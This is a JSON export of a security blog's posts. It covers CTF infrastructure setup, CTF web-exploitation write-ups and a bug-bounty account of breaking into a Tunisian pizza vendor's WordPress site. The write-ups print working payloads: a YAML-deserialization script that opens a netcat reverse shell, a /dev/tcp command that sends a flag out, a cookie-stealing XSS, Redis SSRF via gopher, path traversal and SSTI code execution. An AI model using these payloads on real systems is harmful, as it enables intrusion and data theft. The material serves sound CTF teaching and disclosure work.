[{"authors":["kahla"],"categories":null,"content":"Pentester, Security Enthusiastic from Tunisia, I enjoy playing in hacking and pentesting competitions and skip classes to play CTF.\n","date":1566333101,"expirydate":-62135596800,"kind":"taxonomy","lang":"en","lastmod":1566333101,"objectID":"b6c9ad53abeba5bdfba580c41a4e130a","permalink":"https://ahmed-belkahla.me/authors/kahla/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/authors/kahla/","section":"authors","summary":"Pentester, Security Enthusiastic from Tunisia, I enjoy playing in hacking and pentesting competitions and skip classes to play CTF.","tags":null,"title":"Belkahla Ahmed","type":"authors"},{"authors":["kahla"],"categories":null,"content":"Pentester, Security Enthusiastic from Tunisia, I enjoy playing in hacking and pentesting competitions and skip classes to play CTF.\n","date":-62135596800,"expirydate":-62135596800,"kind":"taxonomy","lang":"en","lastmod":-62135596800,"objectID":"2525497d367e79493fd32b198b28f040","permalink":"https://ahmed-belkahla.me/authors/admin/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/authors/admin/","section":"authors","summary":"Pentester, Security Enthusiastic from Tunisia, I enjoy playing in hacking and pentesting competitions and skip classes to play CTF.","tags":null,"title":"Belkahla Ahmed","type":"authors"},{"authors":null,"categories":null,"content":"Last month our team organized FwordCTF 2020 and we got very positive feedbacks and fortunately most of the players enjoyed their journey. More than 1900 participants and 980 teams took part of this first edition, as I was responsible of managing the infrastructure it was a great challenge to deal with this great number and create a secure environment for unsecure challenges :v so i\u0026rsquo;ll share with you my experience maybe it can inspire you.\nNOTE: This is not a step by step tutorial, it\u0026rsquo;s my way to document things so I can remember them next year.\nCloudflare Stats:\nSections  Platform Infrastructure Issues We faced Challenges Management and health check Isolated Container for each participant in Bash category Next edition ?  Platform Infrastructure We have mainly used AWS services, there is no special reason for this choice but I was more familiar with AWS and every member in our team had free 100$ credits in AWS Educate xD For impatient people here is the global architecture we used at the beginning of the CTF, it was the ideal choice for us but we faced some problems that obliged us to switch to an another alternative.\nDetails:\n 4 * CTFD Instance: Ubuntu Server 20.04 LTS t2.medium (4Gb Memory / 2 * Vcpus) : a docker swarm Master Node + 3 * Worker nodes (more details later) Redis caching instance: Ubuntu Server 20.04 LTS t2.small (2Gb Memory / 1 * Vcpus) : A separate instance for Redis ( caching system ) Bastion: Ubuntu Server 20.04 LTS t2.small (2Gb Memory / 1 * Vcpus): As you can notice all CTFD and redis instances are in a private subnet so we can\u0026rsquo;t SSH to them that\u0026rsquo;s why we need a bastion that is in a public subnet, and as all the subnets are in the same VPC so we can SSH from Bastion to the servers in the private subnet. Amazon RDS Instance: db.t2.small at the beginning then upgraded it to db.t2.medium: Amazon RDS is a nice way to set up, operate, and scale a relational database in the cloud. It has also a nice automated backup system.   Cloudflare free plan: Cloudflare really saved us a lot , we faced more than DDOS attacks and some of them were really serious attacks but hackers can\u0026rsquo;t be hacked easily :p   Sendgrid free account (25k free emails): We used Sendgrid for email verification and for sending the certificates after the CTF. AWS Network Load Balancer   AWS S3 bucket to serve the files to download.   NAT Gateway: NAT gateway is important to enable internet connection for the private subnets.  VPC:\nSubnets:\nWe used docker swarm for orchestration and it was really helpful , we created 4 replicas in each node ( learn more about Docker Swarm here ) but after some time we decided to change our strategy , docker swarm had a weakness which is sharing volumes ; every volume mount is local to that node, this was not something critical and there are some solutions available but as it was something unpredictable for us and we didn\u0026rsquo;t test it before, we decided to choose the safest option and replaced the 4 CTFD instances with a single t2.xlarge instance ( 16GB Memory/4 Vcpus ) that contains also 4 replicas of CTFD . The result is the following:\nIssues We faced AWS RDS We are really thankful that this error occured 5 days before the CTF. Only 1 hour after the we launched the platform, we kept having internal server errors , after some debugging we discovered AWS RDS (mysql DBs in general) has an attribute max_connections which is set by default to a low value and once we exceeded that value CTFD couldn\u0026rsquo;t connect to the database, but after changing the max_connections value and restarting things we kept having the 500 internal errors :( . After a lot of debugging and analysis I discovered that the containers couldn\u0026rsquo;t resolve the database domain name which is really strange because AWS DNS server was running flawlessly. To make things shorter, docker swarm overlay network\u0026rsquo;s IP range was overlapping with the physical network, so when the container try to resolve the DB domain name it didn\u0026rsquo;t really send a request to AWS DNS , the solution was to launch the swarm with the following command:\nsudo docker swarm init --default-addr-pool 192.168.0.0/16  it took us only 35 minutes to discover the problem and solve it, but it was the most stressful minutes in my life xD\nCommon problems Docker Swarm sticky sessions\nDocker swarm doesn\u0026rsquo;t have by default a layer 7 load balancer , so we had faced some problems related to sessions, the solution was easy, we only needed to add our own load balancer that supports sticky sessions (we used traefik instead of nginx and it did really great )\nOther Issues\nI needed to set SQLALCHEMY_MAX_OVERFLOW in CTFD to a high value in order to avoid some DB problems and I also had to add some code to CTFD in order to connect successfully to my S3 bucket (AWS Educate accounts have an extra parameter that need to be used and CTFD doesn\u0026rsquo;t handle this case).\nChallenges Management and health check For Web tasks every framework needs a custom docker-compose.yml file so every author took care of his task. For the other categories we used a t2.medium instance for each task and docker swarm to orchestrate the containers ( each task has 3 replicas) and to make sure that we will have no down time (if a container failed there is always two other containers running). this is an automated version where you only have to create a Dockerfile for the task (take a look at my github repo for examples):\nSteps:\n Put the following docker-compose.yml file in the same directory with the task:  version: \u0026quot;3.8\u0026quot; services: task: image: 127.0.0.1:5000/task build: context: . dockerfile: ./Dockerfile container_name: taskName deploy: mode: replicated replicas: 3 networks: - isolated ports: - \u0026quot;9999:1234\u0026quot; #ToChange networks: isolated:   Choose the port you want Run the following start.sh with root privileges  #!/bin/bash echo \u0026quot;[!] Run me with sudo pleaaaaase!\u0026quot; docker run -it --name registry -p 127.0.0.1:5000:5000 -d registry:2 if [ $? -eq 0 ]; then echo \u0026quot;[+] registry done!\u0026quot; else echo \u0026quot;Failed\u0026quot; fi docker-compose -f docker-compose.yml build docker-compose -f docker-compose.yml push if [ $? -eq 0 ]; then echo \u0026quot;[+] Image pushed!\u0026quot; else echo FAILED fi docker swarm init docker stack deploy --compose-file docker-compose-sample.yml task if [ $? -eq 0 ]; then echo \u0026quot;[+] Done, Fword FTW\u0026quot; else echo FAILED fi  NOTE: In case you faced any errors you have to leave the swarm and retry again (don\u0026rsquo;t forget to use the last version of docker-compose)\nThis was a quick solution to facilitate things during the CTF and it may be optimized, in fact I\u0026rsquo;m thinking of releasing a tool that do everything for us but I\u0026rsquo;m just too lazy.\nMangement: Some of you may be wondering how we could manage more than 22 servers, we used an awesome tool called  Termius (it\u0026rsquo;s free in Github Student Pack) which is an SSH client with a lot of awesome features, it lets you organize the servers in groups and ssh to them with just a double click.\nPlatform:\nIsolated Container for each participant in Bash category I think that many people are waiting for this section, in bash category there were some tasks that required an SSH connection so to provide a better environment we came up with this solution and every player will be assigned to an isolated container.\nTechnical details:\nThe idea is simple, we firstly instanciate a manager which is a container running the SSH server and for each connection it will instanciates a new container (from the image of the task) and connects to it (docker inside docker).\nIt may look simple but it took me a little bit of time to implement it and test it. Please take a look at this  sample if you want to adapt this method.\nSteps:\n Run docker-compose -f docker-compose-task.yml build Run docker-compose -f docker-compose.yml up  And Bingo you will have SSH listening on port 10000, you can create a cron job to kill the participants containers every period of time or optimize manage.sh script. Please feel free to contact me if you have any questions or optimizations.\nNext edition ? Personally, I prefer using kubernetes in the next edition and automate health checks for each task. Finding a solution to enable a separate environment for every participant in all categories is also a nice idea and finally develop our custom platform.\nConclusion I\u0026rsquo;m so happy this edition was concluded successfully and we got great feedbacks, I have definitely learned a lot from this opportunity, can\u0026rsquo;t wait for the next edition ; it will be more exciting !! For any questions you can contact me on twitter or facebook!\n","date":1600733280,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1600733280,"objectID":"934f2736f647937b797482e304759c3e","permalink":"https://ahmed-belkahla.me/post/fwordctf_infrastructure/","publishdate":"2020-09-22T00:08:00Z","relpermalink":"/post/fwordctf_infrastructure/","section":"post","summary":"How to deploy a scalable and robust CTF infrastructure and the different issues we faced in FwordCTF 2020","tags":null,"title":"International CTF Infrastructure Management","type":"post"},{"authors":null,"categories":null,"content":"Web RTC (450pts) 39 solves Last weekend,we have been a part of the CSAW CTF 2020 and our team Fword ranked 4th in MENA region. We managed to solve all web challenges with my awesome teammates @Hera and @Noxious and we have particularly enjoyed Web RTC .\nTL;DL   Exploiting CoTurn server in order to gain SSRF.\n  Escalating SSRF to RCE using Redis.\n  Overview We have a Real Time Chat web app and we were provided with the source code / Dockerfile / supervisor.conf.\nExamining the source code didn\u0026rsquo;t really bring something to the table.But we got some juicy stuff ,reading the Dockerfile / supervisor.conf. It turned out that the application is using TURN protocol to relay the network traffic between peers and Redis as a caching system.\nExploitation Since the application didn\u0026rsquo;t seem vulnreable, we decide to focus basically on CoTURN server exploitation. After searching around we found the following HackerOne report which claims that it\u0026rsquo;s possible to abuse the TURN Protocol to gain SSRF. In fact, the attacker may proxy TCP connections to the internal network by setting the XOR-PEER-ADDRESS of the TURN connect message (method 0x000A, https://tools.ietf.org/html/rfc6062#section-4.3) to a private IPv4 address.\nWe used the following  tool to exploit that issue.\nWe can notice that the Coturn server IP is returned to confirm the SSRF.\nUnfortunately fetching localhost ip didn\u0026rsquo;t work for us so we fired up wireshark to monitor the STUN (TURN Protocol is an extension of STUN protocol) packets.\nWe can confirm that the coTurn server has some protections blacklisting local ips. We first tried to bruteforce the internal ip but in vain , finally we managed to bypass this protection using 0.0.0.0 ip:\nAnd Bingo we achieved the first part!\nEscalating SSRF to RCE using Redis This part was somehow trivial but it took us some time to exploit Redis properly, we used some instructions from this  tool ( we fired a Rogue server from it) and executed the following commands:\nAnd Voilaa We got our beloved flag :D It was our first time dealing with RTC website and exploiting and it was really fun!\nReferences:\n   Article About the vulnerability\n   HackerOne Article\n  ","date":1600041600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1600041600,"objectID":"ef279e36ae1b7332c9eac24a03dad731","permalink":"https://ahmed-belkahla.me/post/csaw2020-webrtc/","publishdate":"2020-09-14T00:00:00Z","relpermalink":"/post/csaw2020-webrtc/","section":"post","summary":"Web RTC (450pts) 39 solves Last weekend,we have been a part of the CSAW CTF 2020 and our team Fword ranked 4th in MENA region. We managed to solve all web challenges with my awesome teammates @Hera and @Noxious and we have particularly enjoyed Web RTC .","tags":null,"title":"CSAW CTF2020 - Web RTC Writeup","type":"post"},{"authors":null,"categories":null,"content":"Our team Fword organized FwordCTF 2020 with more than 900 teams and 1900 participants , I\u0026rsquo;ve been in charge of managing the infrastructure and Web + Bash categories, we will discuss infrastructure stuffs in future articles and how to deploy things as our platform got a maximum of 2mins down and tasks had 0 down time.\nHowever in this article we will discuss the possible ways of solving my Web / Bash tasks.\nPastaXSS (5 solves) 500pts This task was a symfony project and we were given the souce code (in fact all tasks had the source code attached to avoid any possible ways of guess).\nEnumeration When you visit the website we have a register/login page, after creating an account we can notice that we have the possibility to post a jutsu with markdown possibility. There is also a feature in the website that let us import a jutsu from a website, hmmm I smell some SSRF vector here. There is also a report admin page that only accepts http://web1.fword.wtf/jutsu/{id} .\nMarkdown in jutsu:\nExploitation Taking a look at the source code, you can notice in this part that the web page is using some caching , things began to be interesting here (SSRF+caching can lead to some juicy results)\nJutsusController.php\npublic function viewJutsu($id,EntityManagerInterface $em,CacheInterface $cache,MarkdownParserInterface $markdown){ $repo=$em-\u0026gt;getRepository(Jutsus::class); $jutsu=$repo-\u0026gt;findOneBy([\u0026quot;id\u0026quot;=\u0026gt;$id]); $this-\u0026gt;denyAccessUnlessGranted(\u0026quot;SHOW\u0026quot;,$jutsu); //fetch jutsu + htmlspecialchars+markdown $name=$jutsu-\u0026gt;getName(); $desc=htmlspecialchars($jutsu-\u0026gt;getDescription()); $description=$cache-\u0026gt;get(\u0026quot;jutsu\u0026quot;.$jutsu-\u0026gt;getId(),function()use($markdown,$desc){ return $markdown-\u0026gt;transformMarkdown($desc); }); $publishedAt=$jutsu-\u0026gt;getPublishedAt()-\u0026gt;format('Y-m-d H:i:s'); $author=$jutsu-\u0026gt;getUser(); return $this-\u0026gt;render(\u0026quot;jutsus/show.html.twig\u0026quot;,[\u0026quot;name\u0026quot;=\u0026gt;$name,\u0026quot;description\u0026quot;=\u0026gt;$description,\u0026quot;publishedAt\u0026quot;=\u0026gt;$publishedAt,\u0026quot;author\u0026quot;=\u0026gt;$author]); }  And this is the part where curl was used (a symfony service created) :\nclass Curl { public function fetch(string $url):string { $response = shell_exec(\u0026quot;curl '\u0026quot;.escapeshellcmd($url).\u0026quot;' -s --max-time 6\u0026quot;); preg_replace('/\u0026lt;title\u0026gt;(.*)\u0026lt;\\/title\u0026gt;/i','',$response); return (!empty($response)?substr($response,0,780):\u0026quot;\u0026quot;); } public function extractTitle(string $url):string{ $response=$this-\u0026gt;fetch($url); $output=array(); preg_match('/\u0026lt;title\u0026gt;(.*)\u0026lt;\\/title\u0026gt;/i',$response,$output); return (array_key_exists(1,$output) ? $output[1]:\u0026quot;Unknown Jutsu\u0026quot;); } }  So we can notice that if we can edit the cached version to have my XSS payload we will bypass htmlspecialchars sanitization and get our javascript code executed. We can achieve this if we chain the SSRF to communicate with Redis caching system ( you can know from the configuration files that the system is using redis with the hostname redis).\nUsing gopher protocol we can communicate with all text based protocols including redis by just following this pattern:\n gopher://redis:6379/_REDIS Command\n we need to firstly fetch all keys using KEYS * but you can notice the use of escapeshellcmd that will escape * so we have to urlencode our payload in order to bypass this.\n gopher://redis:6379/_KEYS%20%2a\n This will fetch all jutsus for us\nNow we only have to set that key to our XSS payload :\n gopher://redis:6379/_SET%20yLAP6wFwIy%3Ajutsu5598%20%27s%3A81%3A%22%3Cscript%20src%3D%22URL%22%3E%3C%2Fscript%3E%22%3B%27\n And Bingo you will get the flag :\nFwordCTF{Y0u_Only_h4vE_T0_cH4in_4nd_Th1nk_w3ll}\nThere was an unintended solution that exploited a problem in the markdown parser (I contacted the developer to resolve this issue)\n![\u0026lt;img src=\u0026quot;#\u0026quot; onerror=\u0026quot;src='http://requestbin.net/r/12bfihl1?c='+document.cookie; this.onerror=null\u0026quot;/\u0026gt;](#){onerror=outerHTML=alt}\nUseless(3 solves) 500pts In this task we were given a flask project, when we open the website we can notice in the login page the possibility to login using github.After creating an account and signing in we don\u0026rsquo;t see anything special.\nLet\u0026rsquo;s get a look on the source code, after some digging, this part seems interesting, it\u0026rsquo;s the logic handling the Github Oauth.\n@oauth_authorized.connect_via(github_authbp) def github_oauth(github_authbp,token): if not github.authorized: return redirect(url_for(\u0026quot;github.login\u0026quot;)) resp = github.get(\u0026quot;/user\u0026quot;) if not resp.ok: return redirect(url_for(\u0026quot;github.login\u0026quot;)) info=resp.json() auth=oauth.OAuth.query.filter_by(provider_user_id=info[\u0026quot;id\u0026quot;]).first() if auth is None: auth = oauth.OAuth(provider=\u0026quot;github\u0026quot;, provider_user_id=info[\u0026quot;id\u0026quot;], token=token) if auth.user: login_user(auth.user) return redirect(\u0026quot;/home\u0026quot;,302) else: if not validate_username(info[\u0026quot;login\u0026quot;]): return redirect(\u0026quot;/register\u0026quot;) if info[\u0026quot;login\u0026quot;]==\u0026quot;fwordadmin\u0026quot;: user = users.User(username=info[\u0026quot;login\u0026quot;], email=info[\u0026quot;email\u0026quot;],is_admin=True) else: user=users.User(username=info[\u0026quot;login\u0026quot;],email=info[\u0026quot;email\u0026quot;]) auth.user=user base.db_session.add_all([user,auth]) base.db_session.commit() login_user(user) return redirect(\u0026quot;/home\u0026quot;,302) else: login_user(auth.user) return redirect(\u0026quot;/home\u0026quot;, 302)  The meaning of this code (for lazy people :p ) when a user completes the Oauth dance successfully for the first time he will be registered in the database in the User table and we can also notice that fwordadmin is the github account of the admin (this information will help us next).\nNow our goal is to login using fwordadmin account, there\u0026rsquo;s something suspicious in the previous code, when you connect via github you don\u0026rsquo;t need any password but indeed the user is still saved in the same table where regular registrations are stored so we have to wonder what password is set by default or is there some column to verify the login method (which is not the case).\nThe User class confirms our statement, the default password is set to \u0026quot;\u0026rdquo;\nclass User(UserMixin,Base): __tablename__ = 'users' id = Column(Integer, primary_key=True) username = Column(String(50), unique=True) email = Column(String(120), unique=True) password_hash=Column(String(200)) is_admin=Column(Boolean) def __init__(self, username=None, email=None,password=\u0026quot;\u0026quot;,is_admin=False): self.username = username self.email = email print(\u0026quot;pass :\u0026quot;+password) self.set_password(password) self.is_admin=is_admin  So if we connect with the following credentials we will takeover the admin account:\nlogin: fwordadmin password: //  There is a check that removes special characters so the password will be interpreted as \u0026quot;\u0026rdquo; at the end.\nNow we have access to the admin panel that has a feature that parses docker-compose files (yaml file) so even without reading the source code we can know that is a yaml unsafe deserialization exploit.\nThe vulnerable code:\ndef parse(text): try: res = yaml.load(text, Loader=Loader) return res except Exception: return \u0026quot;An Error has occured\u0026quot;  This is my final exploit that spawns a reverse shell:\nimport yaml,subprocess,requests class Payload(object): def __reduce__(self): return (subprocess.Popen,(tuple('nc IP PORT -e /bin/bash'.split(\u0026quot; \u0026quot;)),)) deserialized_data = yaml.dump(Payload()) data1={\u0026quot;username\u0026quot;:\u0026quot;fwordadmin\u0026quot;,\u0026quot;password\u0026quot;:\u0026quot;////\u0026quot;} print(\u0026quot;[+] Payload is: \u0026quot;+deserialized_data) #yaml.load(deserialized_data,Loader=yaml.Loader) data2={\u0026quot;service\u0026quot;:deserialized_data} s=requests.Session() r=s.post(\u0026quot;https://useless.fword.wtf/login\u0026quot;,data=data1) if r.status_code==200: print(\u0026quot;[+] Logged in successfully\u0026quot;) r=s.post(\u0026quot;https://useless.fword.wtf/home\u0026quot;,data=data2) print(\u0026quot;[+] Shell Spawned, check your listener)  I hope you had fun solving this task and learned from it , i tried to inspire it from a project in my internship .\nOtaku (8 solves) 500pts This was a Node Js application with its source code as always (i tried to use all known languages in the web tasks xd), opening the website we have a simple login/register page and a home page.\nHome Page:\nWe have an update feature after connecting to update our favorite anime and username, le\u0026rsquo;s have a look at its source code:\napp.post(\u0026quot;/update\u0026quot;,(req,res)=\u0026gt;{ try{ if(req.session.username \u0026amp;\u0026amp; req.session.anime){ if(req.body.username \u0026amp;\u0026amp; req.body.anime){ var query=JSON.parse(`{\u0026quot;$set\u0026quot;:{\u0026quot;username\u0026quot;:\u0026quot;${req.body.username}\u0026quot;,\u0026quot;anime\u0026quot;:\u0026quot;${req.body.anime}\u0026quot;}}`); client.connect((err)=\u0026gt;{ if (err) return res.render(\u0026quot;update\u0026quot;,{error:\u0026quot;An unknown error has occured\u0026quot;}); const db=client.db(\u0026quot;kimetsu\u0026quot;); const collection=db.collection(\u0026quot;users\u0026quot;); collection.findOne({\u0026quot;username\u0026quot;:req.body.username},(err,result)=\u0026gt;{ if (err) {return res.render(\u0026quot;update\u0026quot;,{error:\u0026quot;An unknown error has occured\u0026quot;});console.log(err);} if (result) return res.render(\u0026quot;update\u0026quot;,{error:\u0026quot;This username already exists, Please use another one\u0026quot;});}); collection.findOneAndUpdate({\u0026quot;username\u0026quot;:req.session.username},query,{ returnOriginal: false },(err,result)=\u0026gt;{ if (err) return res.render(\u0026quot;update\u0026quot;,{error:\u0026quot;An unknown error has occured\u0026quot;}); var newUser={}; var attrs=Object.keys(result.value); attrs.forEach((key)=\u0026gt;{ newUser[key.trim()]=result.value[key]; if(key.trim()===\u0026quot;isAdmin\u0026quot;){ newUser[\u0026quot;isAdmin\u0026quot;]=0; } }); req.session.username=newUser.username; req.session.anime=newUser.anime; req.session.isAdmin=newUser.isAdmin; req.session.save(); return res.render(\u0026quot;update\u0026quot;,{error:\u0026quot;Updated Successfully\u0026quot;}); }); }); } else return res.render(\u0026quot;update\u0026quot;,{error:\u0026quot;An unknown error has occured\u0026quot;}); } else res.redirect(302,\u0026quot;/login\u0026quot;); } catch(err){ console.log(err); } });  We can easily notice the NoSQL injection in  var query=JSON.parse(`{\u0026quot;$set\u0026quot;:{\u0026quot;username\u0026quot;:\u0026quot;${req.body.username}\u0026quot;,\u0026quot;anime\u0026quot;:\u0026quot;${req.body.anime}\u0026quot;}}`); and prototype pollution here :\n var newUser={}; var attrs=Object.keys(result.value); attrs.forEach((key)=\u0026gt;{ newUser[key.trim()]=result.value[key]; if(key.trim()===\u0026quot;isAdmin\u0026quot;){ newUser[\u0026quot;isAdmin\u0026quot;]=0; } });  Our goal is to set isAdmin to 1, the prototype pollution vulnerable part is parsing the result json object of NoSQL query, so if we chain the NoSQL injection with prototype pollution we will have the possibility to set isAdmin to 1, we can achieve this by injecting the following in anime field:\n brrr\u0026rdquo;,\u0026rdquo; proto\u0026rdquo; : {\u0026ldquo;isAdmin\u0026rdquo;:1}, \u0026ldquo;aaaa\u0026rdquo;:\u0026ldquo;aaa\n W don\u0026rsquo;t have to forget the whitespace before __proto__ because mongo doesn\u0026rsquo;t accept it by default but we can notice the usage of trim() so adding some whitespace will do the trick.\nNow we have admin access:\nIn the admin panel we have the possibility to set an environment variable and run a js script, the intended idea is to set NODE_VERSION env variable to some js code followed by // and then execute /proc/self/environ. The content of /proc/self/environ will be interpreted as Js code ( we chose NODE_VERSION because it\u0026rsquo;s the first env var, we knew it by connecting to the node docker image and checking its environment variables).\nFinal payload:\nenvname: NODE_VERSION env: process.mainModule.require('child_process').exec(\u0026quot;bash -c \\\u0026quot; cat /flag.txt \u0026gt; /dev/tcp/IP/PORT\\\u0026quot;\u0026quot;); // path: /proc/self/environ  And Bingo we got our flag\nOther Writeups Super Guesser Team writeups, they solved all web challenges :D LINK\nHexion Team Otaku task writeup LINK\nBash Category These category included some privesc and jail challenges , some really nice writeups were written by the teams that participated, so i\u0026rsquo;ll put some links here (I\u0026rsquo;m just lazy to write my own writeups):\nJailBoss:\n Writeup 1\n Writeup 2\nCapiCapi\n Writeup 1\n Writeup 2\nBash is Fun\n Writeup 1\n Writeup 2\nSource Code You can visit this github repo where i\u0026rsquo;ll publish all related things to FwordCTF 2020 ( I have already published the tasks source code )\n FwordCTF 2020\nThank you for reading the entire article, if you have any questions you can contact me on twitter @belkahlaahmed1 . organizing this huge CTF was really a unique experience and I learned a lot from it. Long life Fword Team you are just awesome guys.\n","date":1599005280,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1599005280,"objectID":"13e1338e987a6d0b065b205e44f238f6","permalink":"https://ahmed-belkahla.me/post/fword-ctf2020/","publishdate":"2020-09-02T00:08:00Z","relpermalink":"/post/fword-ctf2020/","section":"post","summary":"Official writeups for FwordCTF2020 Web/Bash challenges","tags":null,"title":"FwordCTF 2020 - Web/Bash Writeups","type":"post"},{"authors":null,"categories":null,"content":"After a long week of work I decided to participate in CSICTF2k20 with my team Fword since I didn\u0026rsquo;t participate for a long time :( We were among the top 30 teams and we managed to almost solve all Web exploitaion tasks with my teammate @Hera. However I enjoyed solving File Library and The Usual Suspects tasks.\nFile Library 497pts (40 solves) We are given the source code of the task :\nconst express = require('express'); const path = require('path'); const fs = require('fs'); const app = express(); const PORT = process.env.PORT || 3000; app.listen(PORT, () =\u0026gt; { console.log(`Listening on port ${PORT}`); }); app.get('/getFile', (req, res) =\u0026gt; { let { file } = req.query; console.log(\u0026quot;file is: \u0026quot;+file); if (!file) { res.send(`file=${file}\\nFilename not specified!`); return; } try { if (file.includes(' ') || file.includes('/')) { res.send(`file=${file}\\nInvalid filename!`); return; } } catch (err) { res.send('An error occured!'); return; } if (!allowedFileType(file)) { res.send(`File type not allowed`); return; } if (file.length \u0026gt; 5) { file = file.slice(0, 5); } const returnedFile = path.resolve(__dirname + '/' + file); console.log(\u0026quot;returnedFile: \u0026quot;+returnedFile); fs.readFile(returnedFile, (err) =\u0026gt; { if (err) { if (err.code != 'ENOENT') console.log(err); res.send('An error occured!'); return; } res.sendFile(returnedFile); }); }); app.get('/*', (req, res) =\u0026gt; { res.sendFile(__dirname + '/index.html'); }); function allowedFileType(file) { const format = file.slice(file.indexOf('.') + 1); console.log(\u0026quot;index +1 is \u0026quot;+file.indexOf('.') + 1); console.log(\u0026quot;format inside allowedfile is: \u0026quot;+format); if (format == 'js' || format == 'ts' || format == 'c' || format == 'cpp') { return true; } return false; }  I added some logging statements to facilitate things, as you can see when we visit /getfile we can provide in a get parameter a filename that will be displayed for us but there are some restrictions, we can\u0026rsquo;t use whitespaces or \u0026ldquo;/\u0026quot;, there are only four extensions that are allowed (js|ts|c|cpp) .\nAfter reading carefully the source code, I was pretty sure that we will use http parameters pollution because there is no check concerning the type of get parameters so we can enter an array and try to exploit the misbehaviour that may occur.\nLet\u0026rsquo;s imagine that we enter the following array :\n [\u0026quot;../../\u0026quot;,\u0026quot;../../\u0026quot;,\u0026quot;../../\u0026quot;,\u0026quot;../../\u0026quot;,\u0026quot;../../proc/self/cwd/flag.txt\u0026rdquo;,\u0026quot;.\u0026quot;,\u0026ldquo;js\u0026rdquo;]\n  1st Check : if (file.includes(' ') || file.includes('/'))  When includes is applied to an array it will check if there\u0026rsquo;s a field that is equal to the passed parameter (\u0026rdquo; \u0026quot; and \u0026ldquo;/\u0026rdquo; in our case) which is false here so we can successfully pass this check\n 2nd Check : if (!allowedFileType(file))  Let\u0026rsquo;s take a look at the code of this function :\nfunction allowedFileType(file) { const format = file.slice(file.indexOf('.') + 1); if (format == 'js' || format == 'ts' || format == 'c' || format == 'cpp') { return true; } return false; }  It will slice our array beginning from the indexOf(\u0026quot;.\u0026quot;)+1 so in our case the result will be the last field of our array which is \u0026ldquo;js\u0026rdquo; and Bingo we will also pass this check :D\nThe following lines will remove the last two fields of our array :\nif (file.length \u0026gt; 5) { file = file.slice(0, 5); }  so our array will become:\n [\u0026quot;../../\u0026quot;,\u0026quot;../../\u0026quot;,\u0026quot;../../\u0026quot;,\u0026quot;../../\u0026quot;,\u0026quot;../../proc/self/cwd/flag.txt\u0026rdquo;]\n And finally after resolving the path returnedFile will contain /proc/self/cwd/flag.txt\nconst returnedFile = path.resolve(__dirname + '/' + file);  Note: __dirname which is the current directory is ignored because of our \u0026ldquo;../../\u0026rdquo; fields, and /proc/self/cwd is equivalent to the current directory.\nSo finally our array will be resolved to the path we want, this is the final payload which is only a traduction to what we said before:\nhttp://chall.csivit.com:30222/getfile?file[]=../../\u0026amp;file[]=../../\u0026amp;file[]=../../\u0026amp;file[]=../../\u0026amp;file[]=../../proc/self/cwd/flag.txt\u0026amp;file[]=.\u0026amp;file[]=js  It was a really nice task so thanks to the author!\nThe Usual Suspects 499pts (32 solves) Visiting the website, a well trained eye can directly notice the possibility of an SSTI attack in icecream parameter.\nWe thought that it was a typical SSTI task but unfortunately even after getting RCE using the usual jinja2 SSTI payloads we didn\u0026rsquo;t find anything. The first payload we used:\n {{ \u0026lsquo;'.class.mro[1].subclasses()[270](\u0026lsquo;ls\u0026rsquo;,shell=True,stdout=-1).communicate()}}\n After this step we really didn\u0026rsquo;t know what to do, the server used here was Tornado, which is an asynchronous python web server so I started reading its documentation and I noticed that the Main class always inherits from tornado.web.RequestHandler. After some digging I got a nice idea , what if we list all the subclasses of Object ( The super class, it\u0026rsquo;s the parent of all classes) Then we will list the subclasses of tornado.web.RequestHandler and finally we will check the globals of get function from MainHadnler class.\n Get the RequestHandler class:   {{ \u0026lsquo;'.class.mro[1].subclasses()[363]}}\n  Get the MainHandler class which inherits from RequestHandler   {{ \u0026lsquo;'.class.mro[1].subclasses()[363].subclasses()[-1]}}\n And finally we will see the globals of get function ( globals is a reference to the dictionary that holds the functionâ€™s global variables ). Final payload:\n{{ ''.__class__.__mro__[1].__subclasses__()[363].__subclasses__()[-1].get.__globals__}}  Bingo we got our flag :D I asked the admin and he told me that this is the unintended solution of the task.\nIf you have any questions you can contact me on twitter @BelkahlaAhmed1 or contact our team twitter @FwordTeam ! I hope that you liked the writeup, and don\u0026rsquo;t forget to participate in FwordCTF on 29th of August , a lot of fun challenges will be there.\n","date":1595318400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1595318400,"objectID":"4c19a2dfc3f4ed7c359776d7b1855b24","permalink":"https://ahmed-belkahla.me/post/csictf2020/","publishdate":"2020-07-21T08:00:00Z","relpermalink":"/post/csictf2020/","section":"post","summary":"Web exploitation writeups of CSICTF 2k20 - File Library Task and The Unusual Suspects Web tasks","tags":null,"title":"CSICTF 2k20 - Web Exploitation","type":"post"},{"authors":null,"categories":null,"content":"How i hacked a famous pizza vendor in Tunisia ? Generally i\u0026rsquo;m not a fan of bug bounty programs but this time i tried to test my skills in some real world scenario and participate to secure some tunisian websites as they lack a lot of things in term of security :D It\u0026rsquo;s 11h pm and i was sitting on my laptop like always doing an annoying java homework for school when i felt hungry :( and accidentally an X pizza (we will call it X pizza as i was asked to not reveal the company name) ad catched my eye on facebook. I decided to take a look on their website and try to find a way to break it.\nExploitation I started browsing the website and doing some basic recon , it was a typical wordpress website without any catching exploits or some really outdated plugins . I have also ran the famous Wpscan and tried to brute force the admin account but unfortunately i got nothing.\nMy next step was trying to explore if there\u0026rsquo;s some insecure code management and Bingo it appeared that the developers forgot the .git directory there, so we can dump the source code of the web app. I used the famous gitdumper and extractor shell scripts to do that and we were so lucky! i found some juicy informations there ( a database backup for all users and promo codes , wp-config file containing all secret codes and salts used to hash users passwords ..) This was really some juicy informations but i wanted to explore more , i started reviewing the source code and after a while i found an awesome api , it checks a hardcoded token and then using only a phone number as input it logins to the phone number owner account :o\nWhy do they use it ? This api was meant to be accessed only from the call service employees and the developer told me that only some white listed ips were allowed to visit it. It was like a secret hidden backdoor .\nHowever using the hardcoded token we can access any account , you may be asking how i found the phone number of a privileged user , the database didn\u0026rsquo;t have any useful informations for this (it was an old DB) so i had to think for a while and finally i remembered that i found and old list of orders informations in the uploads directory and usually the first order will be passed by the developer to test the web app so i searched there for a little bit and Bingo after entering the phone number w got access to the admin dashboard :D\nI wanted to stop here but i think it was possible to get a reverse shell by modifying the templating files and i believe that they are using a shared server (many websites hosted on the same server) so going so far won\u0026rsquo;t be a good idea .\nI really had fun trying to break the website, the developer was so nice and fixed this out so quickly and for me i had to skip my morning classes as i completed all 